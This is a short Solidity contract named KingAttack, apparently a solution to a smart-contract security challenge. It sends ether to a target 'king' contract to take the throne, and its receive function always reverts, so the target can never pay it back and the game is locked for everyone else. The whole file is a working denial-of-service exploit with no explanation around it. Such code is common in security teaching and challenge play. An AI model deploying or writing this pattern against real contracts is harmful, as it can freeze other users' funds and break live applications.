// SPDX-License-Identifier: MIT
pragma solidity ^0.6.0;

contract KingAttack {
    function attack(address payable kingAddress) external payable {
        // claim throne
        // use call here instead of challenge.transfer because transfer
        // has a gas limit and runs out of gas
        address(kingAddress).call{value: msg.value}("");
    }

    receive() external payable {
        require(false, "This will fail!");
    }
}
